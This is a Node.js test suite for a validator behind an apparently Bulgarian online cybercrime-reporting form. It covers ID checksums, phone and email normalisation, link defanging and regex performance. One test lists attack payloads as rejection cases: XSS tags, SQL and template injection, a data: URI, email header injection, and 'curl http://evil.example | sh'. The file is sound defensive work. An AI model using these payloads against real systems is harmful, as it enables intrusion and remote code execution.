import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validateReport, validEgn, normalizePhone, looksDangerous, scanText, analyzeUrl, defangUrl } from '../src/validate.js';

const makeEgn = (yy, mm, dd, region = '123') => {
  const base = `${yy}${mm}${dd}${region}`;
  const w = [2, 4, 8, 5, 10, 9, 7, 3, 6];
  const check = (w.reduce((a, wi, i) => a + wi * Number(base[i]), 0) % 11) % 10;
  return `${base}${check}`;
};

const good = () => ({
  crimeType: 'phishing',
  alreadyReported: 'no',
  fullName: 'Иван Петров Георгиев',
  egn: makeEgn('90', '05', '12'),
  phone: '0888 123 456',
  email: 'Ivan.Petrov@example.com',
  content: 'Получих SMS с линк към фалшив сайт на банка и въведох данните си на hxxps://fake-bank.example.',
  consent: true,
  notEmergency: true,
  truthDeclaration: true,
});

test('valid report passes and is normalised', () => {
  const r = validateReport(good());
  assert.equal(r.ok, true, JSON.stringify(r.errors));
  assert.equal(r.value.phone, '+359888123456');
  assert.equal(r.value.email, 'ivan.petrov@example.com');
});

test('EGN: checksum, date, century markers', () => {
  assert.equal(validEgn(makeEgn('90', '05', '12')), true);
  assert.equal(validEgn(makeEgn('05', '45', '12')), true); // 2005 (+40)
  assert.equal(validEgn(makeEgn('75', '23', '16')), true); // 1875 (+20)
  assert.equal(validEgn(makeEgn('90', '02', '31')), false); // no 31 Feb
  assert.equal(validEgn(makeEgn('90', '13', '01')), false);
  assert.equal(validEgn('123'), false);
  assert.equal(validEgn('abcdefghij'), false);
  const e = makeEgn('90', '05', '12');
  const bad = e.slice(0, 9) + String((Number(e[9]) + 1) % 10);
  assert.equal(validEgn(bad), false);
});

test('required fields are enforced', () => {
  const r = validateReport({});
  assert.equal(r.ok, false);
  for (const f of ['crimeType', 'alreadyReported', 'fullName', 'egn', 'phone', 'email', 'content', 'consent']) {
    assert.ok(r.errors[f], `missing error for ${f}`);
  }
});

test('three names required', () => {
  assert.equal(validateReport({ ...good(), fullName: 'Иван Петров' }).errors.fullName, 'three_names');
  assert.equal(validateReport({ ...good(), fullName: 'Иван П3тров Георгиев' }).errors.fullName, 'invalid');
  assert.equal(validateReport({ ...good(), fullName: "Мария-Луиза О'Брайън Йорданова" }).ok, true);
});

test('already-reported: yes requires unit / signal number', () => {
  assert.equal(validateReport({ ...good(), alreadyReported: 'yes' }).errors.reportedTo, 'required');
  const r = validateReport({ ...good(), alreadyReported: 'yes', reportedTo: '03 РУ-СДВР, сигнал 1234/2026' });
  assert.equal(r.ok, true);
  assert.equal(r.value.reportedTo, '03 РУ-СДВР, сигнал 1234/2026');
  assert.equal(validateReport({ ...good(), alreadyReported: 'maybe' }).errors.alreadyReported, 'required');
  // answer "no" drops any stale text
  assert.equal(validateReport({ ...good(), alreadyReported: 'no', reportedTo: 'x' }).value.reportedTo, '');
});

test('consent must be literally true', () => {
  assert.equal(validateReport({ ...good(), consent: 'true' }).errors.consent, 'required');
  assert.equal(validateReport({ ...good(), consent: false }).errors.consent, 'required');
});

test('phone formats', () => {
  assert.equal(normalizePhone('+359 88 812 3456'), '+359888123456');
  assert.equal(normalizePhone('0035987 1234567'), '+359871234567');
  assert.equal(normalizePhone('+44 7911 123456'), '+447911123456');
  assert.equal(normalizePhone('02 123 4567'), ''); // BG landline is not a mobile
  assert.equal(normalizePhone('0868123456'), ''); // 086 is not a mobile prefix
  assert.equal(normalizePhone('abc'), '');
});

test('email: rejects header-injection and malformed values', () => {
  for (const email of ['a@b', 'a@@b.com', 'a b@c.com', 'a@b.com\r\nBcc: x@y.com', 'a..b@c.com', '@c.com', 'a@-c.com']) {
    assert.ok(validateReport({ ...good(), email }).errors.email, email);
  }
});

test('dangerous content is rejected', () => {
  const payloads = [
    '<script>alert(1)</script> и още текст за да е достатъчно дълго',
    'Моля вижте <img src=x onerror=alert(1)> това е достатъчно дълго съобщение',
    'натиснете javascript:alert(1) за да видите повече от достатъчно дълъг текст',
    "x' OR '1'='1 -- това е достатъчно дълго съобщение за валидиране",
    'ще изпълни ; curl http://evil.example | sh достатъчно дълго съобщение',
    'шаблон {{constructor.constructor("x")()}} достатъчно дълго съобщение тук',
    'data:text/html;base64,PHNjcmlwdD4= достатъчно дълго съобщение тук ето',
  ];
  for (const content of payloads) {
    assert.equal(validateReport({ ...good(), content }).errors.content, 'dangerous', content);
  }
  assert.ok(looksDangerous('<b>'));
  assert.equal(looksDangerous('Платих 500 евро на сметка BG12 и повече не ми отговарят.'), false);
});

test('invisible / bidi characters are stripped, not trusted', () => {
  const r = validateReport({ ...good(), fullName: 'Иван‮ Петров​ Георгиев' });
  assert.equal(r.ok, true);
  assert.equal(r.value.fullName, 'Иван Петров Георгиев');
});

test('length limits', () => {
  assert.equal(validateReport({ ...good(), content: 'къс' }).errors.content, 'too_short');
  assert.equal(validateReport({ ...good(), content: 'а'.repeat(5001) }).errors.content, 'too_long');
  const many = Array.from({ length: 25 }, (_, i) => `https://a${i}.example/x`).join(' ');
  assert.equal(validateReport({ ...good(), content: many }).errors.content, 'too_many_links');
});

test('optional fields: loss amount needs a currency, date not in future', () => {
  assert.equal(validateReport({ ...good(), lossAmount: '150,50' }).errors.lossCurrency, 'required');
  assert.equal(validateReport({ ...good(), lossAmount: '150,50', lossCurrency: 'EUR' }).ok, true);
  assert.equal(validateReport({ ...good(), lossAmount: '-5', lossCurrency: 'EUR' }).errors.lossAmount, 'invalid');
  assert.equal(validateReport({ ...good(), incidentDate: '2999-01-01' }).errors.incidentDate, 'invalid');
  assert.equal(validateReport({ ...good(), incidentDate: '2026-02-30' }).errors.incidentDate, 'invalid');
  assert.equal(validateReport({ ...good(), incidentDate: '2026-02-10' }).ok, true);
  assert.equal(validateReport({ ...good(), crimeType: 'nope' }).errors.crimeType, 'required');
  assert.equal(validateReport({ ...good(), channel: 'carrier-pigeon' }).errors.channel, 'invalid');
});

test('honeypot flag', () => {
  assert.equal(validateReport({ ...good(), fax: 'http://spam' }).value.honeypot, true);
  assert.equal(validateReport(good()).value.honeypot, false);
});

test('non-object payloads', () => {
  for (const p of [null, 'x', 5, [], undefined]) assert.equal(validateReport(p).ok, false);
});

test('link analysis flags and defangs', () => {
  assert.deepEqual(analyzeUrl('http://192.168.0.1/login'), ['ip-address-host']);
  assert.ok(analyzeUrl('https://xn--pple-43d.com').includes('punycode'));
  assert.ok(analyzeUrl('https://bit.ly/abc').includes('url-shortener'));
  assert.ok(analyzeUrl('https://paypal.com@evil.example/').includes('credentials-in-url'));
  assert.ok(analyzeUrl('https://x.example/invoice.exe').includes('executable-or-archive'));
  assert.equal(defangUrl('https://evil.example.com/a?b=c.d'), 'hxxps[://]evil[.]example[.]com/a?b=c.d');
  const s = scanText('Влезте в https://evil.example/login. Или www.bad-site.top, и evil2.com.');
  assert.equal(s.urlCount, 2);
  assert.ok(!/https?:\/\//.test(s.defanged));
  assert.ok(!/\w\.\w/.test(s.defanged.replace(/\[\.\]/g, '')), s.defanged);
  // scheme-less shortener links are analysed too, not just defanged
  const b = scanText('Свалих файл от bit.ly/xyz123 вчера.');
  assert.equal(b.urlCount, 1);
  assert.ok(b.urls[0].flags.includes('url-shortener'));
  assert.equal(b.defanged, 'Свалих файл от bit[.]ly/xyz123 вчера.');
});

test('date of birth can replace the ЕГН (English form)', () => {
  const noEgn = { ...good(), egn: '' };
  let r = validateReport({ ...noEgn, dob: '1990-05-12' });
  assert.equal(r.ok, true, JSON.stringify(r.errors));
  assert.equal(r.value.dob, '1990-05-12');
  assert.equal(r.value.egn, '');
  // one of the two is required
  r = validateReport(noEgn);
  assert.equal(r.errors.egn, 'required');
  assert.equal(r.errors.dob, 'required');
  // a ЕГН that is given must still be valid, even next to a valid date
  r = validateReport({ ...good(), egn: '1234567890', dob: '1990-05-12' });
  assert.equal(r.errors.egn, 'invalid');
  assert.equal(r.errors.dob, undefined);
  // both valid is fine
  assert.equal(validateReport({ ...good(), dob: '1990-05-12' }).ok, true);
});

test('date of birth: real calendar date, 1900 or later, not in the future', () => {
  for (const dob of ['1990-5-12', '12/05/1990', '1899-12-31', '2999-01-01', '1990-02-30', '1990-13-01', 'abc', '1990-05-12T00:00']) {
    assert.equal(validateReport({ ...good(), egn: '', dob }).errors.dob, 'invalid', dob);
  }
  for (const dob of ['1900-01-01', '2000-02-29', '2024-12-31']) {
    assert.equal(validateReport({ ...good(), egn: '', dob }).ok, true, dob);
  }
});

test('currency preselected as EUR does not matter when no amount is entered', () => {
  const r = validateReport({ ...good(), lossAmount: '', lossCurrency: 'EUR' });
  assert.equal(r.ok, true, JSON.stringify(r.errors));
  assert.equal(r.value.lossCurrency, ''); // dropped: nothing to attach it to
  const withAmount = validateReport({ ...good(), lossAmount: '250', lossCurrency: 'EUR' });
  assert.equal(withAmount.ok, true);
  assert.equal(withAmount.value.lossCurrency, 'EUR');
});

test('link analysis is linear: crafted input cannot burn CPU (regression for quadratic regex)', () => {
  const crafted = ['a.'.repeat(2500), 'a.a-'.repeat(1250), 'www.' + 'a.'.repeat(2496), 'http://' + 'a.'.repeat(2490), 'evil.com '.repeat(555)];
  for (const content of crafted) {
    const t = performance.now();
    validateReport({ ...good(), content: content.slice(0, 5000), suspect: content.slice(0, 300) });
    assert.ok(performance.now() - t < 10, `took too long for ${content.slice(0, 12)}…`);
  }
});

test('link analysis: wrappers, punctuation, e-mail domains and scheme-less links', () => {
  const s = scanText('Сайт: (https://evil.example/login), www.bad.top, bit.ly/abc, user@evil.com и evil2.com.');
  assert.equal(s.defanged, 'Сайт: (hxxps[://]evil[.]example/login), www[.]bad[.]top, bit[.]ly/abc, user@evil[.]com и evil2[.]com.');
  assert.equal(s.urlCount, 3);
  assert.deepEqual(s.urls.map((u) => u.url), ['https://evil.example/login', 'www.bad.top', 'bit.ly/abc']);
  // Bulgarian text with abbreviations and numbers is left alone
  assert.equal(scanText('т.е. платих 3.5 лв. на 12.10.2026 г.').defanged, 'т.е. платих 3.5 лв. на 12.10.2026 г.');
});

test('confirmations: not-an-emergency and the truth declaration must be literally true', () => {
  for (const key of ['notEmergency', 'truthDeclaration']) {
    for (const bad of [undefined, false, 'true', 1, null]) {
      assert.equal(validateReport({ ...good(), [key]: bad }).errors[key], 'required', `${key}=${bad}`);
    }
  }
  const r = validateReport({});
  assert.equal(r.errors.notEmergency, 'required');
  assert.equal(r.errors.truthDeclaration, 'required');
});

test('evidence checklist: known ids only, canonical order, duplicates dropped', () => {
  let r = validateReport({ ...good(), evidence: ['photos', 'emails', 'photos', 'financial'] });
  assert.equal(r.ok, true, JSON.stringify(r.errors));
  assert.deepEqual(r.value.evidence, ['emails', 'photos', 'financial']);
  assert.deepEqual(validateReport({ ...good() }).value.evidence, []);
  assert.deepEqual(validateReport({ ...good(), evidence: [] }).value.evidence, []);
  for (const bad of ['photos', ['photos', 'bitcoin'], [1], { photos: true }, Array(9).fill('photos')]) {
    assert.equal(validateReport({ ...good(), evidence: bad }).errors.evidence, 'invalid', JSON.stringify(bad));
  }
});
